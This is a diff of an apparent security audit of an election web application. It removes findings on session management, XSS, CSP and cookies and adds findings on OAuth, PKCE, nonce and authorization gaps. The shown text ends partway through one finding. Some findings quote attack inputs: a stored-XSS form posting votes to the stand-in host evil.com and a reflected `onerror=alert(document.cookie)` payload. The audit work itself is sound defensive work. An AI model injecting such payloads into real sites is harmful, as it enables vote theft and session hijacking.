-| Source Reports | 7.4.5.md |
-| Related | - | **Description:**
-
-There is no administrative capability to terminate active sessions for individual users or all users. The `/admin` page (line 279) only shows election management functionality. No session management endpoints exist anywhere in the application code. If a user account is compromised or a user leaves the organization, administrators cannot force session invalidation. Active compromised sessions persist until natural expiration, extending the window for unauthorized access to election data and voting.
-
-**Remediation:**
-
-Implement an admin session management interface with endpoints for viewing active sessions, terminating sessions for individual users, and terminating all sessions. Add proper admin role definition and implement session store with termination API. Example implementation includes: `/admin/sessions` GET endpoint to list all active sessions, `/admin/sessions/terminate/<uid>` POST endpoint to terminate sessions for a specific user, and `/admin/sessions/terminate-all` POST endpoint to invalidate all active sessions. All endpoints should require proper admin role authorization and log administrative actions.
-
----
-
-#### FINDING-027: Missing User Session Viewing and Termination Functionality
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟠 High |
-| ASVS Level(s) | L2 |
-| CWE | - |
-| ASVS sections | 7.5.2 |
-| Files | v3/server/pages.py (entire file scope) |
-| Source Reports | 7.5.2.md |
-| Related | - | **Description:**
-
-There is no functionality for users to view their currently active sessions or terminate specific sessions. The /profile and /settings pages do not include any session management capabilities. No endpoints exist for listing or invalidating user sessions. Users cannot detect if their account is being used from unauthorized locations/devices. If a session is compromised, the legitimate user has no mechanism to revoke it other than the single "Sign Out" link (which only terminates their current session). This is especially critical for a voting system where unauthorized session use could result in fraudulent votes.
-
-**Remediation:**
-
-Implement three new endpoints: (1) GET /sessions - Display all active sessions for the authenticated user with metadata (device, time, location), marking the current session. (2) POST /sessions/terminate/&lt;session_id&gt; - Allow termination of a specific session after re-authentication with at least one factor. (3) POST /sessions/terminate-all - Terminate all sessions except the current one, also requiring re-authentication. All termination operations must verify user identity through re-authentication before execution. Add session listing data to the profile template and create a new sessions.ezt template for the session management interface.
-
----
-
-#### FINDING-028: Voting operation lacks step-up authentication or secondary verification
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟠 High |
-| ASVS Level(s) | L3 |
-| CWE | - |
-| ASVS sections | 7.5.3 |
-| Files | v3/server/pages.py (372-407) |
-| Source Reports | 7.5.3.md |
-| Related | - | **Description:**
-
-Voting — a highly sensitive operation in an election system — does not require step-up authentication or secondary verification. Once a user has an active session, they can cast votes with no additional verification. An attacker with a hijacked session (via XSS exploitation facilitated by the placeholder CSRF token) can cast votes on behalf of the victim without any additional authentication challenge. In a voting system, casting votes is the most sensitive operation. Without step-up authentication, a compromised session directly leads to election manipulation. Combined with the non-functional CSRF protection (line 83: basic.csrf_token = 'placeholder'), this creates a critical attack surface for vote manipulation via session hijacking or CSRF.
-
-**Remediation:**
-
-Implement step-up authentication that requires recent re-authentication for sensitive operations. Example implementation: Create a require_step_up_auth function that checks if the last step-up authentication occurred within a validity window (e.g., 5 minutes). If not, redirect to a step-up authentication page before allowing the vote operation to proceed. Store the last_step_up_auth timestamp in the session and validate it before processing votes.
-
----
-
-#### FINDING-029: State-Changing GET Endpoints Enable Session Creation + Action Without User Interaction
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟠 High |
-| ASVS Level(s) | L2 |
-| CWE | - |
-| ASVS sections | 7.6.2 |
-| Files | v3/server/pages.py (539-556), v3/server/pages.py (559-574) |
-| Source Reports | 7.6.2.md |
-| Related | - | **Description:**
-
-State-changing operations (opening/closing elections) are exposed as GET endpoints with authentication decorators. This creates a compound violation where silent session creation can be immediately followed by sensitive state changes without explicit user interaction. When a user has an expired RP session but active IdP session, an attacker can craft a link that triggers OAuth flow, creates a new session at the RP, and immediately executes a state-changing operation (election opened/closed). The data flow: User has expired RP session but active IdP session → Attacker crafts link to /do-open/abc1234567 → User clicks link → Auth decorator triggers OAuth flow with silent re-auth at IdP → New session created at RP → State-changing operation executes. An attacker who can induce a user to click a link or load an image can trigger election state changes without the user's knowledge or explicit consent.
-
-**Remediation:**
-
-Convert state-changing operations from GET to POST and require CSRF token validation. Change @APP.get to @APP.post for do_open_endpoint and do_close_endpoint functions. Implement and validate CSRF tokens (not placeholder) in these endpoints before executing state changes. This prevents link-triggered session creation combined with immediate state changes.
-
----
-
-#### FINDING-030: Stored XSS in HTML Context - Election and Issue Metadata
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟠 High |
-| ASVS Level(s) | L1, L3 |
-| CWE | CWE-79 |
-| ASVS sections | 1.2.1, 3.2.3 |
-| Files | v3/server/templates/vote-on.ezt (80), v3/server/templates/vote-on.ezt (82), v3/server/templates/vote-on.ezt (83), v3/server/templates/vote-on.ezt (111) |
-| Source Reports | 1.2.1.md, 3.2.3.md |
-| Related | FINDING-031, FINDING-032, FINDING-033, FINDING-034, FINDING-035, FINDING-126, FINDING-127, FINDING-128 | **Description:**
-
-Admin sets issue description containing malicious HTML such as `<form id="voteForm" action="https://evil.com/steal">` which is stored in DB and rendered as raw HTML in voting page. When JavaScript calls `document.getElementById('voteForm')`, it resolves to attacker's element instead of the legitimate form. The `submitFormWithLoading('voteForm', ...)` function then submits votes to attacker's server. The vulnerability exists because `rewrite_description()` outputs raw HTML (`<pre>{desc}</pre>` where desc is unescaped user content) and vote-on.ezt renders descriptions as HTML without escaping.
-
-**Remediation:**
-
-1. HTML-escape descriptions before rendering (prevents injection entirely). 2. Use explicit variable references instead of `getElementById` for critical elements: Store direct references at initialization (e.g., `const voteFormRef = document.querySelector('form#voteForm[method="POST"]');`). 3. Verify element type before use: `if (!(voteFormRef instanceof HTMLFormElement)) throw new Error('Form element compromised');`
-
----
-
-#### FINDING-031: Stored XSS in HTML Context - Issue Descriptions in Management Template
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟠 High |
-| ASVS Level(s) | L1 |
-| CWE | CWE-79 |
-| ASVS sections | 1.2.1 |
-| Files | v3/server/templates/manage.ezt (248) |
-| Source Reports | 1.2.1.md |
-| Related | FINDING-030, FINDING-032, FINDING-033, FINDING-034, FINDING-035, FINDING-126, FINDING-127, FINDING-128 | **Description:**
-
-Issue descriptions are output without HTML encoding in the management template. Unlike vote-on.ezt where rewrite_description is called, manage.ezt outputs descriptions directly. A description containing script tags would execute. Issue descriptions from the database are output raw into HTML div elements.
-
-**Remediation:**
-
-Apply HTML encoding to issue descriptions: &lt;div id="description-[issues.iid]" class="description mt-2"&gt;[format "html"][issues.description][end]&lt;/div&gt;
-
----
-
-#### FINDING-032: Output encoding performed too early in rewrite_description function
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟠 High |
-| ASVS Level(s) | L2 |
-| CWE | CWE-79 |
-| ASVS sections | 1.1.2 |
-| Files | v3/server/pages.py (50-59) |
-| Source Reports | 1.1.2.md |
-| Related | FINDING-030, FINDING-031, FINDING-033, FINDING-034, FINDING-035, FINDING-126, FINDING-127, FINDING-128 | **Description:**
-
-The rewrite_description function constructs HTML markup and stores it on the object property before rendering. Output encoding/escaping is being performed too early (or rather, not at all). The function constructs HTML markup by embedding raw user-controlled content (issue.description) directly into HTML tags without encoding. This pre-baked HTML is then output in the template. Since EZT doesn't HTML-encode by default, the description content is never encoded. The encoding should happen at template render time, but the function makes this impossible by mixing raw user content with HTML structure prematurely.
-
-**Remediation:**
-
-Apply html.escape() to the description text before constructing HTML markup, and use urllib.parse.quote() for filenames in constructed URLs. Example: import html; desc = html.escape(issue.description); def repl(match): filename = html.escape(match.group(1)); url_filename = urllib.parse.quote(match.group(1)); return f'&lt;a href="/docs/{issue.iid}/{url_filename}"&gt;{filename}&lt;/a&gt;'; desc = re.sub(r'doc:([^\s]+)', repl, desc); issue.description = f'&lt;pre&gt;{desc}&lt;/pre&gt;'
-
----
-
-#### FINDING-033: Issue descriptions rendered as raw HTML enabling stored XSS
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟠 High |
-| ASVS Level(s) | L1, L2 |
-| CWE | CWE-79 |
-| ASVS sections | 3.2.2, 1.3.1, 1.3.3, 1.3.5 |
-| Files | v3/server/pages.py (47), v3/server/templates/vote-on.ezt, v3/server/templates/manage.ezt |
-| Source Reports | 3.2.2.md, 1.3.1.md, 1.3.3.md, 1.3.5.md |
-| Related | FINDING-030, FINDING-031, FINDING-032, FINDING-034, FINDING-035, FINDING-126, FINDING-127, FINDING-128 | **Description:**
-
-User-submitted issue descriptions are stored without sanitization and then wrapped in HTML tags (&lt;pre&gt;, &lt;a&gt;) by the rewrite_description() function. Since the content must be rendered unescaped for the formatting to work, malicious HTML/JavaScript in the description executes in the context of all voters viewing the election. Data flow: User submits description via POST → stored in SQLite → retrieved by list_issues() → transformed by rewrite_description() (adds HTML tags) → rendered unescaped in template. No HTML sanitization (bleach.clean(), html.escape()) is applied at any point. This allows authenticated committers who can create/edit issues to inject arbitrary JavaScript that executes in the browsers of all voters, enabling session hijacking, vote manipulation via CSRF, and data exfiltration.
-
-**Remediation:**
-
-Apply html.escape() to issue.description BEFORE constructing HTML in rewrite_description(). Example: desc = html.escape(issue.description) as the first step in the function. This neutralizes any HTML tags in the user input while preserving the ability to add safe formatting tags afterward. For enhanced security, implement a strict allowlist-based HTML sanitizer using bleach or similar library: bleach.clean(issue.description, tags=['b', 'i', 'em', 'strong', 'br'], attributes={}, strip=True)
-
----
-
-#### FINDING-034: Reflected XSS via election/issue/person IDs in error templates
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟠 High |
-| ASVS Level(s) | L1 |
-| CWE | CWE-79 |
-| ASVS sections | 3.2.2 |
-| Files | v3/server/templates/e_bad_eid.ezt, v3/server/templates/e_bad_iid.ezt, v3/server/templates/e_bad_pid.ezt |
-| Source Reports | 3.2.2.md |
-| Related | FINDING-030, FINDING-031, FINDING-032, FINDING-033, FINDING-035, FINDING-126, FINDING-127, FINDING-128 | **Description:**
-
-Election IDs, issue IDs, and person IDs from URL parameters are reflected in error page templates (e_bad_eid.ezt, e_bad_iid.ezt, e_bad_pid.ezt) without HTML encoding. An attacker can craft a URL with a malicious ID containing HTML/JavaScript (e.g., /manage/&lt;img src=x onerror=alert(document.cookie)&gt;). When the load_election decorator catches ElectionNotFound, it sets result.eid to the raw URL parameter and renders the error template with [eid] output unescaped, resulting in reflected XSS.
-
-**Remediation:**
-
-Apply [format "html"] encoding in all error templates: The Election ID ([format "html"][eid][end]) does not exist, The Issue ID ([format "html"][iid][end]) does not exist, The Person ID ([format "html"][pid][end]) does not exist.
-
----
-
-#### FINDING-035: User-uploaded documents served without Content-Disposition or Content-Type restrictions
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟠 High |
-| ASVS Level(s) | L1 |
-| CWE | CWE-79 |
-| ASVS sections | 3.2.1 |
-| Files | v3/server/pages.py (506-523) |
-| Source Reports | 3.2.1.md |
-| Related | FINDING-030, FINDING-031, FINDING-032, FINDING-033, FINDING-034, FINDING-126, FINDING-127, FINDING-128 | **Description:**
-
-User-uploaded documents are served via send_from_directory without Content-Disposition or Content-Type restrictions. Admin uploads document (e.g., exploit.html) which is stored in DOCSDIR/&lt;iid&gt;/ and served with browser-guessed MIME type. Browser renders as HTML in application origin, allowing execution of malicious scripts. Proof of concept: Admin creates election issue with description containing doc:exploit.html, places exploit.html containing script to steal cookies in the docs directory, voter with valid mayvote entry visits /docs/&lt;iid&gt;/exploit.html, and browser renders the document as HTML in the application's origin, executing the script.
-
-**Remediation:**
-
-Validate docname to prevent path traversal by checking for '..' or '/' or '\' characters and aborting with 400 if present. Force download disposition and restrict content type by using as_attachment=True parameter in send_from_directory which sets Content-Disposition: attachment. Add X-Content-Type-Options: nosniff header and Content-Security-Policy: default-src 'none' header to the response.
-
----
-
-#### FINDING-036: Authenticated Document Endpoint Serves Resources Without Cross-Origin-Resource-Policy or Sec-Fetch-* Validation
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟠 High |
-| ASVS Level(s) | L3 |
-| CWE | - |
-| ASVS sections | 3.5.8 |
-| Files | v3/server/pages.py (651-666) |
-| Source Reports | 3.5.8.md |
-| Related | - | **Description:**
-
-The serve_doc endpoint serves authenticated election documents without Cross-Origin-Resource-Policy headers or Sec-Fetch-* validation. Authenticated election documents (images, diagrams, PDFs) can be loaded on attacker pages via cross-origin img/video/object/embed tags, leaking confidential election materials. This creates a timing/existence oracle where attackers can determine whether a user has mayvote access to specific elections by checking load success/failure. With permissive CORS or browser bugs, pixel-level data extraction from images is possible.
-
-**Remediation:**
-
-1. Validate Sec-Fetch-Site and Sec-Fetch-Dest headers, only allowing 'same-origin', 'none' (direct navigation), or empty string. Reject all other values with 403. 2. Add 'Cross-Origin-Resource-Policy: same-origin' response header to all document responses to prevent cross-origin embedding at the browser level.
-
----
-
-#### FINDING-037: Missing Comprehensive Session Cookie Security Configuration
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟠 High |
-| ASVS Level(s) | L1, L2 |
-| CWE | CWE-614 |
-| ASVS sections | 3.3.1, 3.3.2, 3.3.3, 3.3.4 |
-| Files | v3/server/main.py (44), v3/server/pages.py (Application-wide) |
-| Source Reports | 3.3.1.md, 3.3.2.md, 3.3.3.md, 3.3.4.md |
-| Related | - | **Description:**
-
-The application does not explicitly configure critical security attributes for session cookies including: Secure attribute, __Host-/__Secure- prefix, HttpOnly attribute, and SameSite attribute. While the asfquart framework may provide some defaults internally, no explicit cookie security configuration exists in the application code. This creates dependency on undocumented framework behavior and leaves session cookies vulnerable to: (1) interception via network sniffing if transmitted over unencrypted connections, (2) cross-site request forgery attacks due to missing SameSite protection, (3) JavaScript access via XSS due to unverified HttpOnly enforcement, and (4) subdomain cookie injection attacks due to missing __Host- prefix. The session cookie is created by the framework without explicit security hardening in v3/server/main.py.
-
-**Remediation:**
-
-Explicitly configure all session cookie security attributes in the create_app() function:
-
-```python
-app.config.update(
-    SESSION_COOKIE_NAME='__Host-steve_session',
-    SESSION_COOKIE_SECURE=True,
-    SESSION_COOKIE_HTTPONLY=True,
-    SESSION_COOKIE_SAMESITE='Strict',
-    SESSION_COOKIE_PATH='/',
-)
-```
-
-This ensures: (1) Secure attribute prevents transmission over HTTP, (2) __Host- prefix binds cookie to exact host and enforces Secure/Path requirements, (3) HttpOnly prevents JavaScript access, (4) SameSite=Strict prevents cross-site request inclusion.
-
----
-
-#### FINDING-038: No Content-Security-Policy Header Defined in Any HTTP Response
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟠 High |
-| ASVS Level(s) | L2, L3 |
-| CWE | CWE-1021 |
-| ASVS sections | 3.4.3, 3.4.7 |
-| Files | v3/server/main.py (Application-wide), v3/server/pages.py (Application-wide) |
-| Source Reports | 3.4.3.md, 3.4.7.md |
-| Related | FINDING-039, FINDING-040 | **Description:**
-
-The application does not set a Content-Security-Policy header on any HTTP response. Without CSP, the application has no defense-in-depth against cross-site scripting (XSS) attacks, data exfiltration via injected &lt;object&gt;, &lt;embed&gt;, or &lt;base&gt; tags, and clickjacking via embedded frames. The ASVS requirement mandates at minimum: object-src 'none', base-uri 'none', plus either an allowlist or nonces/hashes for script sources. Client requests flow through route handlers to template rendering and HTTP responses without any CSP header being set. An XSS payload would execute without CSP restrictions. Additionally, no CSP violation reporting endpoint is configured (report-uri/report-to directives), meaning XSS exploitation attempts and policy misconfigurations go undetected.
-
-**Remediation:**
-
-Implement a global after_request handler in main.py that sets CSP headers on every response:
-
-```python
-@app.after_request
-async def set_security_headers(response):
-    csp = (
-        "default-src 'self'; "
-        "script-src 'self'; "
-        "style-src 'self'; "
-        "object-src 'none'; "
-        "base-uri 'none'; "
-        "frame-ancestors 'self'; "
-        "report-uri /csp-report; "
-        "report-to csp-endpoint"
-    )
-    response.headers['Content-Security-Policy'] = csp
-    response.headers['Report-To'] = '{"group":"csp-endpoint","max_age":86400,"endpoints":[{"url":"/csp-report"}]}'
-    return response
-```
-
-Add CSP violation reporting endpoint:
-
-```python
-@APP.post('/csp-report')
-async def csp_report():
-    report = await quart.request.get_json(force=True)
-    _LOGGER.warning(f'CSP Violation: {report}')
-    return '', 204
-```
-
-Deploy Content-Security-Policy-Report-Only initially to identify policy violations before enforcement.
-
----
-
-#### FINDING-039: No frame-ancestors CSP Directive Prevents Clickjacking
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟠 High |
-| ASVS Level(s) | L2 |
-| CWE | CWE-1021 |
-| ASVS sections | 3.4.6 |
-| Files | v3/server/main.py (Application-wide), v3/server/pages.py (Application-wide) |
-| Source Reports | 3.4.6.md |
-| Related | FINDING-038, FINDING-040 | **Description:**
-
-The web application does not set the frame-ancestors directive in the Content-Security-Policy header for any HTTP response. This allows the application to be embedded in iframes on malicious sites, enabling clickjacking attacks. All page handlers return responses without framing protection. The /do-open/&lt;eid&gt; and /do-close/&lt;eid&gt; endpoints use GET methods and perform state-changing operations, making them particularly vulnerable to clickjacking combined with the lack of framing protection. An attacker can create a malicious page with an iframe embedding the application and trick authenticated users into performing unintended actions.
-
-**Remediation:**
-
-Implement a global after_request handler that sets the frame-ancestors directive in the Content-Security-Policy header for every response:
-
-```python
-@app.after_request
-async def set_security_headers(response):
-    csp = response.headers.get('Content-Security-Policy', '')
-    if 'frame-ancestors' not in csp:
-        if csp:
-            csp += "; frame-ancestors 'self'"
-        else:
-            csp = "frame-ancestors 'self'"
-    response.headers['Content-Security-Policy'] = csp
-    return response
-```
-
-Additionally, convert /do-open/&lt;eid&gt; and /do-close/&lt;eid&gt; from GET to POST methods to reduce clickjacking and CSRF attack surface.
-
-#### FINDING-040: Missing Cross-Origin-Opener-Policy Header on HTML Responses
+#### FINDING-009: Non-constant-time Comparison in Tamper Check Allows Timing Oracle
 
 | Attribute | Value |
 |-----------|-------|
 | **Severity** | 🟠 High |
 | **ASVS Level(s)** | L3 |
-| **CWE** | CWE-1021 |
-| **ASVS Sections** | 3.4.8 |
-| **Files** | v3/server/pages.py (Application-wide), v3/server/main.py (Application-wide) |
-| **Source Reports** | 3.4.8.md |
-| **Related Findings** | FINDING-038, FINDING-039 | **Description:**
+| **CWE** | N/A |
+| **ASVS Sections** | 11.2.4 |
+| **Files** | v3/steve/election.py:331 |
+| **Source Reports** | 11.2.4.md |
+| **Related Findings** | None |
 
-The application does not set the `Cross-Origin-Opener-Policy` (COOP) header on any HTTP responses that render HTML documents. There is no `after_request` handler, middleware, or framework configuration that adds this header. All template-rendered endpoints (using `@APP.use_template()`) return HTML responses without COOP protection. Without COOP, cross-origin pages that open or are opened by the application can retain references to the `Window` object. This enables tabnabbing attacks (where a malicious page opened via `target=_blank` replaces the opener with a phishing page) and frame-counting side-channel attacks.
+**Description:**
+
+Python's != operator on bytes objects performs a short-circuit comparison that returns False as soon as the first differing byte is found. An attacker who can observe response timing could potentially determine how many leading bytes of the opened_key match, gradually reconstructing the stored key. The opened_key is derived from election data and serves as the anti-tamper seal; leaking it could allow an attacker to forge tamper checks.
 
 **Remediation:**
 
-Implement an `after_request` handler to set the COOP header on all HTML responses:
-
-```python
-@APP.after_request
-async def set_security_headers(response):
-    content_type = response.content_type or ''
-    if 'text/html' in content_type:
-        response.headers['Cross-Origin-Opener-Policy'] = 'same-origin'
-    return response
-```
+Use hmac.compare_digest() for constant-time comparison. Replace return opened_key != md.opened_key with return not hmac.compare_digest(opened_key, md.opened_key).
 
 ---
 
-#### FINDING-041: No TLS Protocol Version Enforcement
+#### FINDING-010: Authorization decisions do not consider delegated authorization claims (scope, authorization_details)
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟠 High |
+| **ASVS Level(s)** | L2 |
+| **CWE** | N/A |
+| **ASVS Sections** | 10.3.2 |
+| **Files** | v3/server/pages.py:63-93 |
+| **Source Reports** | 10.3.2.md |
+| **Related Findings** | None |
+
+**Description:**
+
+The application establishes sessions from OAuth tokens and then makes authorization decisions solely based on the `uid` extracted from the session and role memberships (committer, pmc_member). There is no evidence that OAuth scopes or `authorization_details` claims are evaluated during authorization decisions. The session data structure only captures `uid`, `fullname`, and `email` — no scope or delegation information is preserved from the access token. If the OAuth client was granted limited scopes (e.g., read-only access), the resource server would not enforce those limitations. Any valid authenticated session grants full access within the role, regardless of what the resource owner actually delegated.
+
+**Remediation:**
+
+Preserve OAuth token claims (scope, authorization_details) in the session during establishment. Modify basic_info() to include scope and authorization_details in the session data structure. Implement scope-based authorization decorators that verify required scopes before allowing access to endpoints. Example: Create a require_scope() decorator that checks if the required scope is present in the user's token claims before executing the endpoint logic. Store scope as a space-separated string and authorization_details as a list in the session.
+
+---
+
+#### FINDING-011: Multiple endpoints have placeholder authorization checks - ownership not enforced
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟠 High |
+| **ASVS Level(s)** | L1, L2, L3 |
+| **CWE** | CWE-862 |
+| **ASVS Sections** | 10.3.2, 8.2.1, 8.3.1, 8.4.2, 8.2.2, 2.3.2 |
+| **Files** | v3/server/pages.py:487, v3/server/pages.py:508, v3/server/pages.py:420, v3/server/pages.py:527, v3/server/pages.py:552, v3/server/pages.py:576, v3/server/pages.py:467, v3/server/pages.py:351, v3/server/pages.py:193 |
+| **Source Reports** | 10.3.2.md, 8.2.1.md, 8.3.1.md, 8.4.2.md, 8.2.2.md, 2.3.2.md |
+| **Related Findings** | None |
+
+**Description:**
+
+Function-level authorization is NOT enforced for election management operations. The owner_pid and authz group checks are documented as required in the schema but are not implemented—all endpoints contain '### check authz' TODO comments but no actual authorization logic. This is a Type B gap: the authorization model EXISTS in the schema/documentation (owner_pid and authz fields) but is NOT CALLED at any management endpoint. Any authenticated committer can view, open, close, add issues to, edit issues on, delete issues from, and modify dates on any election they don't own. This affects all 11 administrative endpoints that use the @load_election decorator. The authz field format is explicitly marked TBD indicating incomplete design.
+
+**Remediation:**
+
+Implement check_election_authz() function to verify the current user is authorized to manage the election by checking owner_pid match or authz group membership via LDAP. Add this check to the load_election decorator before allowing access to management functions. Example: async def check_election_authz(election, uid): md = election.get_metadata(); if md.owner_pid == uid: return True; if md.authz: if await check_ldap_group_membership(uid, md.authz): return True; return False. Then in load_election decorator: if not await check_election_authz(e, result.uid): quart.abort(403). Apply to all administrative endpoints including do_open_endpoint, do_close_endpoint, do_add_issue_endpoint, do_edit_issue_endpoint, do_delete_issue_endpoint, do_set_open_at_endpoint, do_set_close_at_endpoint, manage_page, and manage_stv_page.
+
+---
+
+#### FINDING-012: No PKCE Parameters in OAuth Authorization Request or Token Exchange
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟠 High |
+| **ASVS Level(s)** | L2 |
+| **CWE** | N/A |
+| **ASVS Sections** | 10.4.6 |
+| **Files** | v3/server/main.py:38-42 |
+| **Source Reports** | 10.4.6.md |
+| **Related Findings** | None |
+
+**Description:**
+
+The authorization URL template (OAUTH_URL_INIT) contains state and redirect_uri but no code_challenge or code_challenge_method parameters. The token exchange URL template (OAUTH_URL_CALLBACK) contains only code but no code_verifier parameter. There is no evidence of PKCE code verifier generation or storage anywhere in the codebase. Even if the ASF OAuth server supports PKCE, the client is not sending the required parameters, which means PKCE protection is not active for this application. An attacker who intercepts the authorization code (e.g., via a malicious browser extension, open redirect, or referrer leakage) can exchange it directly at the token endpoint without needing to prove possession of the original code verifier, since no code verifier was bound to the authorization request.
+
+**Remediation:**
+
+Implement PKCE by generating a code verifier and code challenge. Update OAuth URL templates to include code_challenge and code_challenge_method=S256 in authorization requests, and code_verifier in token exchange requests. Example: Generate code_verifier using base64.urlsafe_b64encode(os.urandom(32)), compute code_challenge using SHA256 hash of the verifier, and include these parameters in the OAuth URLs. This requires the asfquart framework to support PKCE parameter injection, or the OAuth URL construction must be overridden.
+
+---
+
+#### FINDING-013: Missing nonce parameter in OIDC authorization request enables ID Token replay attacks
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟠 High |
+| **ASVS Level(s)** | L2 |
+| **CWE** | N/A |
+| **ASVS Sections** | 10.5.1 |
+| **Files** | v3/server/main.py:39-41 |
+| **Source Reports** | 10.5.1.md |
+| **Related Findings** | None |
+
+**Description:**
+
+The authorization request URL template includes only 'state' and 'redirect_uri' parameters. There is no 'nonce' parameter included in the authorization request. Per the OIDC specification (Section 3.1.2.1), the 'nonce' value should be: 1) Generated as a cryptographically random value, 2) Sent in the authorization request, 3) Stored in the session, 4) Validated against the 'nonce' claim in the received ID Token. Without a nonce, the client cannot detect if an ID Token is being replayed from a previous authentication session. The 'state' parameter prevents CSRF but does NOT protect against ID Token replay. An attacker who obtains a valid ID Token can replay it to authenticate as the victim user, potentially gaining access to election management or voting capabilities.
+
+**Remediation:**
+
+Generate a cryptographically random nonce value using secrets.token_urlsafe(32), store it in the session, include it in the authorization request URL, and validate it against the nonce claim in the received ID Token during the callback handler. Example: nonce = secrets.token_urlsafe(32); session['oauth_nonce'] = nonce; asfquart.generics.OAUTH_URL_INIT = 'https://oauth.apache.org/auth?state=%s&redirect_uri=%s&nonce=%s'. In the callback handler: id_token_claims = decode_id_token(token_response); if id_token_claims['nonce'] != session.pop('oauth_nonce'): abort(401, 'ID Token nonce mismatch - possible replay attack')
+
+---
+
+#### FINDING-014: Missing Audience (aud) Claim Validation in ID Token
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟠 High |
+| **ASVS Level(s)** | L2 |
+| **CWE** | N/A |
+| **ASVS Sections** | 10.5.4, 9.2.3 |
+| **Files** | v3/server/main.py:39-42, v3/server/pages.py:82-90 |
+| **Source Reports** | 10.5.4.md, 9.2.3.md |
+| **Related Findings** | None |
+
+**Description:**
+
+There is no client_id configuration visible anywhere in the provided source code. For audience validation to work: 1) The application must know its own client_id, 2) The received ID Token's aud claim must be compared against the client_id, 3) If the aud doesn't match, the token must be rejected. Without visible client_id configuration or audience validation logic, the application cannot verify that an ID Token was issued specifically for this client. An attacker who obtains an ID Token issued for a different client registered with the same authorization server could potentially use it to authenticate to this application. The asfquart framework likely handles this internally, but it's not configurable or visible in this codebase, making it impossible to verify compliance.
+
+**Remediation:**
+
+Configure expected audience in create_app(): app.config['TOKEN_AUDIENCE'] = 'steve' and app.config['TOKEN_ISSUER'] = 'https://oauth.apache.org'. Implement token validation function that validates the aud claim against the expected audience (handling both string and list formats) and validates the iss claim against the expected issuer. Example: def validate_token_claims(token_payload): if 'aud' in token_payload: aud = token_payload['aud']; if isinstance(aud, list): if EXPECTED_AUDIENCE not in aud: raise ValueError; elif aud != EXPECTED_AUDIENCE: raise ValueError. Also validate issuer claim similarly.
+
+---
+
+#### FINDING-015: Inconsistent Security Controls Across Privileged Endpoints
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟠 High |
+| **ASVS Level(s)** | L2 |
+| **CWE** | N/A |
+| **ASVS Sections** | 6.3.4 |
+| **Files** | v3/server/pages.py:484-591 |
+| **Source Reports** | 6.3.4.md |
+| **Related Findings** | None |
+
+**Description:**
+
+While a single authentication pathway (OAuth) exists, security controls after authentication are not enforced consistently. Election creation requires R.pmc_member, but election management (opening, closing, modifying issues) only requires R.committer without ownership verification. This creates a horizontal privilege escalation where any committer can manage any election, contradicting the owner_pid model established at creation. Authorization control concept EXISTS (comments prove design intent) but is NOT CALLED at any management endpoint.
+
+**Remediation:**
+
+Verify the authenticated user is the election owner before allowing management operations. Check metadata.owner_pid against result.uid and return 403 if they don't match. Alternatively, create a separate load_owned_election decorator that verifies ownership before allowing modification.
+
+---
+
+#### FINDING-016: Cannot verify signature validation on OAuth token responses — implementation not visible
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟠 High |
+| **ASVS Level(s)** | L2 |
+| **CWE** | N/A |
+| **ASVS Sections** | 6.8.2 |
+| **Files** | v3/server/main.py:39-42 |
+| **Source Reports** | 6.8.2.md |
+| **Related Findings** | None |
+
+**Description:**
+
+The application delegates OAuth token exchange and session establishment to the `asfquart` framework. The critical signature validation step — verifying that the authentication assertion (JWT, token response) from `oauth.apache.org` is properly signed and has not been tampered with — occurs within the `asfquart` framework code which is not provided for audit. From the provided code, we can observe: 1. The OAuth callback URL pattern suggests a simple authorization code exchange (`code=%s`) 2. No explicit JWT signature validation logic is present in the application code 3. The session is consumed in `pages.py` without any additional integrity checks. The comment in `main.py` line 37 (`### is this really needed right now? # Avoid OIDC`) suggests the application deliberately avoids OIDC, which would typically provide standardized signature validation via ID tokens. Using a custom OAuth flow without OIDC increases the risk that signature validation may not be properly implemented.
+
+**Remediation:**
+
+1. Audit the `asfquart` framework's OAuth callback handler to verify signature validation 2. If using plain OAuth 2.0 (not OIDC), ensure the token endpoint response is only accepted over verified TLS and the authorization code is single-use 3. Consider adopting OIDC with proper ID token signature validation using libraries like python-jose to decode and verify JWT signatures.
+
+---
+
+#### FINDING-017: No verification of authentication strength, method, or recentness from IdP
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟠 High |
+| **ASVS Level(s)** | L2 |
+| **CWE** | N/A |
+| **ASVS Sections** | 6.8.4 |
+| **Files** | v3/server/pages.py:82-91 |
+| **Source Reports** | 6.8.4.md |
+| **Related Findings** | None |
+
+**Description:**
+
+The session only stores and checks uid, fullname, and email. There is no evidence that the application: 1. Validates acr (Authentication Context Class Reference) claims 2. Validates amr (Authentication Methods References) claims 3. Validates auth_time to ensure recent authentication 4. Has any documented fallback approach for unknown authentication strength. Sensitive operations in this application include: Creating elections, Opening/closing elections, Voting, Managing election issues. None of these operations verify that the user authenticated with a specific strength mechanism. The comment in main.py line 37 (### is this really needed right now? # Avoid OIDC) further confirms that OIDC claims (where acr, amr, auth_time would typically be found) are not being processed.
+
+**Remediation:**
+
+Implement authentication strength verification for sensitive operations. Check authentication time (require auth within last 15 minutes for sensitive ops), validate acr claim, and document fallback approach if no acr claim is present. Track 'auth_time' in the session and enforce maximum session age for sensitive operations.
+
+---
+
+#### FINDING-018: No session timeout configuration or documentation present in application code
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟠 High |
+| **ASVS Level(s)** | L2 |
